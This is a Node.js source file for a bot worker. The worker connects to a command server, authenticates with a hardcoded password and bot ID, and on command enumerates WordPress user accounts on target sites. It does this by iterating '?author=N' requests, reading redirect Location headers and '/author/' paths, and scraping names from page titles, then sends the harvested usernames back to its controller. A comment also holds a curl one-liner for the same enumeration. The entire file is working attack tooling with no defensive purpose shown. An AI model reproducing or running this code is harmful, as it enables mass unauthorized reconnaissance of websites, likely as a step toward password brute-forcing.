'use strict';

//let Follow = require('../modules/follow-redirects');
//Follow.maxRedirects = 5;
//let Http = Follow.http;
//let Https = Follow.https;
/*
 */
let os = require('os');
let net = require('net');
let fs = require('fs');
let path = require('path');
let http = require('http');
let https = require('https');
let URL = require('url');
let querystring = require('querystring');
let server;
function logToFile(str) {
  console.log(str);
  try {
    fs.appendFileSync('err.log', str + '\r\n');
  } catch(e) {
    console.log(e);
  }
}

let arr = [];

process.on('uncaughtException', function(err) {
  let str = new Error().stack.toString();
  str += ' \n\r ';
  str += err.toString() + ' \n\r ';
  str += err.stack.toString();
  str += '\n---------------------------------\n\r';
  console.log(str);
  try {
    fs.appendFileSync('err.log', str + ' \n\r ');
  } catch (e) {
    console.log('WTF');
  }
  server.sendDebugMsg({
    err: err,
    stack: err.stack.toString(),
    str: str,
    arr: arr
  });
  server.die();
  console.log('uncaught happened. exiting');
  process.exit(0);
});

let config = {
  sentinel: '\0',
  pass : 'BU7TCqwrET5baNjNZ3bG_1',
  timeout: 2.1 * 60 * 1000
};

config.host = process.argv[3];
config.port = process.argv[4];
config.botID = process.argv[2];
config.hasDNS = process.argv[5];

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function getIPS() {
  const interfaces = os.networkInterfaces();
  const addresses = [];
  for (let k in interfaces) {
    for (let k2 in interfaces[k]) {
      var address = interfaces[k][k2];
      if (address.family === 'IPv4' && !address.internal) {
        addresses.push(address.address);
      }
    }
  }

  return addresses;
}



class Connection {
  constructor(sock, onMsg, onClose) {
    if (!sock.remoteAddress) {
      return;
    }
    sock.on('close', () => {
      onClose();
    });
    sock.on('error', err => {

    });
    sock.on('end', () => {
      sock.end();
    });
    sock.on('data', data => {
      this._onData.call(this, data);
    });

    this._onMsg = onMsg;

    this._sock = sock;
    this._recData = '';
    this._ip = sock.remoteAddress;
    this._alive = true;
  }

  _deleteAllMsgsFrom(recData) {
    let split = recData.lastIndexOf(config.sentinel);
    if (split === -1) {
      console.log('split err' + recData);
      logToFile('split err. ' + recData);
    }
    return recData.substring(split + 1);
  };

  _extractAllMsgsFrom(recData) {
    let arr = [];
    while (true) {
      let split = recData.indexOf(config.sentinel);
      if (split === -1) {
        break;
      }
      let msg = recData.substring(0, split);
      recData = recData.substring(split + 1);
      arr.push(msg);
    }
    return arr;
  };

  _onData(data) {
    this._recData += data;
    let msgs = this._extractAllMsgsFrom(this._recData);
    if (msgs.length === 0) {
      /* not fully received yet;*/
      return;
    }
    this._recData = this._deleteAllMsgsFrom(this._recData);
    for (let i = 0; i < msgs.length; i++) {
      let msg = msgs[i];
      console.log(msg);
      this._handleRawMsg(msg);
    }
  }

  _handleRawMsg(msg) {
    if (msg === '') {
      this.send('{}' + config.sentinel); // I'm alive
      return;
    }
    let resp = null;
    let msgObj;
    try {
      msgObj = JSON.parse(msg);
    } catch (e) {
      logToFile('invalid msg');
      logToFile(msg);
      return;
    }
    resp = this._onMsg(msgObj);
    if (resp) {
      this.sendMsg(resp);
    }
  }

  sendMsg(msg) {
    this._sock.write(JSON.stringify(msg) + config.sentinel);
  }

  send(str) {
    this._sock.write(str);
  }

  die() {
    const stack = new Error().stack;
    this.sendMsg({
      type: 'dying',
      stack: stack
    });
    this._sock.end();
    this._sock.destroy();
  }

}

class Server {
  constructor(ip, port, onMsg) {
    this._ip = ip;
    this._port = port;
    this._con = null;
    this._onMsg = onMsg;
    this._connect();
    this._nConnects = 0;
  }
  getNConnects() {
    return this._nConnects;
  }
  die() {
    this._onClose = function() {

    };
    if (this._con) {
      //      this._con.sendMsg({
      //        type: 'dying'
      //      });
      console.log('dying................');
      this._con.die();
    }
  }
  _onClose() {
    console.log('server disconnected.exiting');
    process.exit(0);
    this._con = null;
    setTimeout(() => {
      this._connect();
    });
    console.log('disconnected');
  }



  _onConnect() {
    this._nConnects++;
    this._con.sendMsg({
      type: 'pass',
      pass: config.pass,
      botID: config.botID,
      hasDNS: config.hasDNS,
      ips: []//getIPS()
    });
  }

  sendDebugMsg(msg) {
    let resp = {
      type: 'debug',
      'msg': msg
    };
    this.sendMsg(resp);
  }
  sendMsg(msg) {
    if (!this._con) {
      return;
    }
    this._con.sendMsg(msg);
  }

  _connect() {
    if (this._con) {
      this._con.die();
      this._con = null;
    }
    let onCanNotConnect = function() {
      console.log('can not connect');
      setTimeout(() => {
        this._connect();
      }, 1000);
    }.bind(this);
    let socket = net.connect(this._port, this._ip, () => {
      socket.removeListener('close', onCanNotConnect);
      this._con = new Connection(socket, this._onMsg, this._onClose.bind(this));
      console.log('connected');
      this._onConnect();
      let timeout = config.timeout + getRandomInt(0, 1 * 60 * 1000);
      socket.setTimeout(timeout, () => {
        this.sendDebugMsg({
          msg: 'timeout happend. exiting'
        });
        this._con.die();
        console.log('timeout happened shit. exiting');
        process.exit(0);
      });
      socket.setKeepAlive(true, 30);
    });

    socket.on('error', (err) => {
      console.log(err);
    });
    socket.on('close', onCanNotConnect);

  }
}

function formatHost(host) {
  let res = host;
  if (host.toLowerCase().indexOf('http://') === 0) {
    res = host;
  } else if (host.toLowerCase().indexOf('https://') === 0) {
    res = host;
  } else {
    res = 'http://' + host;
  }

  if (res[res.length - 1] === '/') {
    return res;
  } else {
    return res + '/';
  }
}

function isHttp(host) {
  if (host.toLowerCase().indexOf('http://') === 0) {
    return true;
  }
  return false;
}
let HEADERS = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Encoding':'gzip, deflate', 'Accept-Language':'en-US,en;q=0.8,ka;q=0.6', 'Cache-Control':'max-age=0', 'Connection':'keep-alive', 'Content-Type':'application/x-www-form-urlencoded', 'User-Agent':"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"};

//let HEADERS = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language':'en-US,en;q=0.8,ka;q=0.6', 'Cache-Control':'max-age=0', 'Connection':'keep-alive', 'Content-Type':'application/x-www-form-urlencoded', 'User-Agent':"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"};


function searchInLocation(location) {
  if (!location) {
    return null;
  }
  //  console.log(location);
  const arr = location.split('/');
  for (let i = 0; i < arr.length; i++) {
    const item = arr[i];
    if (item === 'author') {
      if (i < arr.length - 1) {
        const result = arr[i + 1];
        if (result.indexOf('"') !== -1) {
          return null;
        }
        return result;
      }
    }
  }
  return null;
}


function extract_between(content, start, end) {
  if (!content) {
    return null;
  }
  let a = content.indexOf(start);
  if (a == -1) {
    return null;
  }
  a += start.length;
  a = content.substring(a);

  let z = a.indexOf(end);
  if (z == -1) {
    return null;
  }
  let res = a.substring(0, z);
  return res;
}


function searchInSource(source) {
  //user=`curl --max-time 7  -L  "$1"/?author=1 |grep -a "/author/" |grep -a  feed |awk -F '/author/' '{print $2}' |awk -F '/' '{print $1}'`

  let res = extract_between(source, '/author/', '/feed');
  console.log(res);
  if (!res) {
    console.log('no res');
    let ind1 = source.indexOf('/author/');
    console.log(ind1);
    let ind2 = source.indexOf('/feed/');
    console.log(ind2);
    return null;
  }
  let index = res.indexOf('"');
  if (index !== -1) {
    res = res.substring(0, index);
  }
  index = res.indexOf('/');
  if (index !== -1) {
    res = res.substring(0, index);
  }

  index = res.indexOf('\'');
  if (index !== -1) {
    res = res.substring(0, index);
  }

  index = res.indexOf('<');
  if (index !== -1) {
    res = res.substring(0, index);
  }

  index = res.indexOf('>');
  if (index !== -1) {
    res = res.substring(0, index);
  }

  return res;
}

function getHeaderByName(name, headers) {
  for (let i = 0; i < headers.length; i += 2) {
    if (i >= headers.length) {
      break;
    }
    if (headers[i] !== name) {
      continue;
    }
    i++;
    if (i >= headers.length) {
      break;
    }
    return headers[i];
  }
  return null;
}

function isASCII(str){
  if(typeof(str)!=='string'){
    return false;
  }
  for(var i=0;i<str.length;i++){
    if(str.charCodeAt(i)>127){
      return false;
    }
  }
  return true;
}

function extractNamesFromTitle(source) {
  const resultSet = new Set();
  let start = source.indexOf('<title>');
  if (start === -1) {
    return [];
  }
  start += '<title>'.length;
  source = source.substring(start);
  const end = source.indexOf('</title>');
  if (end === -1) {
    return [];
  }
  source = source.substring(0, end);
  if (source.indexOf('\n') !== -1) {
    return -1;
  }
  const arr = source.split(' ');
  for (const word of arr) {
    if (!isASCII(word)) {
      continue;
    }
    if (word.length < 4) {
      continue;
    }
    resultSet.add(word);
  }
  const result = Array.from(resultSet);
  console.log('title:');
  console.log(source);
  console.log(result);
  return result;
}

function extractNamesFromSource(source) {
  const arr = source.split('\n');
  const resultSet = new Set();
  for (const line of arr) {
    if (line.indexOf('feed') === -1) {
      continue;
    }
    if (line.indexOf('author') === -1) {
      continue;
    }
    const str = extract_between(line, 'title="', '"');
    if (!str) {
      continue;
    }
    const arr1 = str.split(' ');
    for (const word of arr1) {
      if (!isASCII(word)) {
        continue;
      }
      if (word.length < 4) {
        continue;
      }
      resultSet.add(word);
    }
  }
  const result = Array.from(resultSet);
  console.log(result);
  return result;
}

function getAuthorName(location, content, timeout, cb) {
  console.log('getting author name');
  console.log(location);
  if (!location && content) {
    let names = extractNamesFromSource(content);
    let names1 = extractNamesFromTitle(content);
    names = names.concat(names1);
    names = Array.from(new Set(names));
    cb(null, names);
    return;
  }

  let protocol = http;
  if (location.indexOf('https://') === 0) {
    protocol = https;
  }

  let timeoutID;

  try {
    console.log('getting author name: %s', location);
    const req = protocol.get(location, resp => {
      let data = '';
      resp.on('data', d => {
        data += d.toString();
      });
      resp.on('end', () => {
        console.log('done');
        let names = extractNamesFromSource(data);
        let names1 = extractNamesFromTitle(data);
        names = names.concat(names1);
        names = Array.from(new Set(names));
        cb(null, names);
      });
    });

    req.on('error', err => {
      cb(null, []);
      cb = function() {};
      clearTimeout(timeoutID);
    });

    timeoutID = setTimeout(() => {
      req.abort();
      cb(null, []);
      cb = function() {};
    }, timeout);

  } catch (e) {
    cb(null, []);
    cb = Function.prototype;
  }
}

function checkByNumber(host, num, timeout, cb) {
  if (timeout <= 0) {
    cb('timeout');
  }
  let host1 = host;
  let getter = https;
  if (isHttp(host)) {
    getter = http;
  }

  if (host[host.length - 1] === '/') {
    host = host.substring(0, host.length - 1);
  }

  let url = host + '?author=' + num;
  let timeoutId;
  console.log('getting: %s', url);
  try {
    let req = getter.get(url, function(res) {
      let ind = arr.indexOf(url);
      console.log("%s Got response: ", url, res.statusCode);
      let location = getHeaderByName('Location', res.rawHeaders);
      //    console.log('location: %s', location);
      let result = searchInLocation(location);
      if (result) {
        //        res.socket.end();
        //        res.socket.destroy();
        //        clearTimeout(timeoutId);
        //        cb(null, result);
        console.log('location result: %s', result);
        //        cb = function() {};
        //        return;
      }
      let content = '';
      console.log(res.statusCode);
      res.on('data', chunk => {
        content += chunk.toString();
      });
      res.on('end', () => {
        console.log('neddddddd');
        console.log(location);
        //      console.log(content);
        clearTimeout(timeoutId);
        if (!result) {
          result = searchInSource(content);
        }
        console.log('source result: %s', result);
        if (!location && content) {
        }
        if (!result) {
          cb(null, null);
          cb = Function.prototype;
          return;
        }
        getAuthorName(location, content, timeout, (err, authors) => {
          cb(null, {
            user: result,
            names: authors
          });
        });
      });
    }).on('error', function(e) {
      console.log('error');
      console.log(e);
      console.log(host1);
      console.log(host);
      console.log(url);
      clearTimeout(timeoutId);
      cb(e);
      cb = function() {};
    });

    timeoutId = setTimeout(() => {
      req.abort();
      cb('timeout');
      cb = function() {};
    }, timeout);

  } catch (e) {
    cb(null, []);
    cb = Function.prototype;
    server.sendDebugMsg({
      msg: e.stack.toString(),
      err: e,
      host1: host1,
      host: host,
      url: url
    });
    return;
  }

}

function getRealHostName(host, timeout, cb) {
  let getter = https;
  if (isHttp(host)) {
    getter = http;
  }
  let timeoutId;

  try {
    let req = getter.get(host, function(res) {
      res.socket.end();
      res.socket.destroy();
      let location = getHeaderByName('Location', res.rawHeaders);
      let oldHost = host;
      if (location) {
        host = URL.resolve(host, location);
        //      host = location;
      }
      /*
       if (host[0] === '/' || host[0] === '?') {
       if (oldHost[oldHost.length - 1] === '/') {
       oldHost = oldHost.substring(0, oldHost.length - 1);
       }
       host = oldHost + location;
       }
       */
      clearTimeout(timeoutId);
      cb(null, host);
      cb = function() {};
    }).on('error', function(e) {
      console.log('error');
      console.log(e);

      clearTimeout(timeoutId);
      cb(e);
      cb = function() {};
    });

    timeoutId = setTimeout(() => {
      req.abort();
      cb('timeout');
      cb = function() {};
    }, timeout);
  } catch (e) {
    console.log(e);
    cb(e);
    cb = Function.prototype;
  }


}


function enumHost(host, start, end, timeout, msgId, server) {
  //  host = 'hbplantrr.org';
  host = formatHost(host);
  let oldHost = host;
  const now = new Date().getTime();
  const limit = now + timeout;
  const users = [];

  let timeoutReached = false;
  const timeoutID = setTimeout(() => {
    timeoutReached = true;
    let msg = {
      type: 'enumHost',
      id: msgId,
      err: 'timeout',
      users: users
    };
    server.sendMsg(msg);
  }, timeout);

  getRealHostName(host, timeout, (err, host) => {

    if (timeoutReached) {
      return;
    }
    if (err) {
      let msg = {
        type: 'enumHost',
        id: msgId,
        err: err,
        users: []
      };
      console.log(msg);
      server.sendMsg(msg);
      clearTimeout(timeoutID);
      return;
    }
    console.log('host was: %s, became: %s', oldHost, host);
    if (timeout < 1000) {
      timeout = 1000;
    }
    let current = start;
    let checking = false;
    let intervalId = setInterval(() => {
      if (timeoutReached) {
        clearInterval(intervalId);
        return;
      }

      if (checking) {
        return;
      }
      if (current > end) {
        clearInterval(intervalId);
        let msg = {
          type: 'enumHost',
          id: msgId,
          users: users
        };
        server.sendMsg(msg);
        clearTimeout(timeoutID);
        return;
      }
      checking = true;
      timeout = limit - new Date().getTime();
      checkByNumber(host, current, timeout, (err, result) => {
        if (err) {
          checking = false;
          return;
        }
        if (!result) {
          result = {
            user: null,
            names: []
          };
        }
        const user = result.user;
        let names = result.names;
        if (!names) {
          names = [];
        }
        if (!user) {
          current = end + 1;
          checking = false;
          return;
        }

        if (users.indexOf(user) !== -1) {
          checking = false;
          return;
        }
        console.log('found user');
        console.log(user);

        if (names.indexOf(user) === -1) {
          names.push(user);
        }
        users.push({
          user: user,
          names: names
        });
        checking = false;
      });
      current++;
    }, 100);

  });
}

server = new Server(config.host, config.port, onMsg);

function onMsg(msg) {
  console.log(msg);
  if (msg.type === 'die') {
    console.log('dying');
    process.exit(0);
  } else if (msg.type === 'enumHost') {
    enumHost(msg.host, msg.start, msg.end, msg.timeout, msg.id, server);
  } else {
    console.log('unknown msg');
    console.log(msg);
    process.exit(0);
  }
}
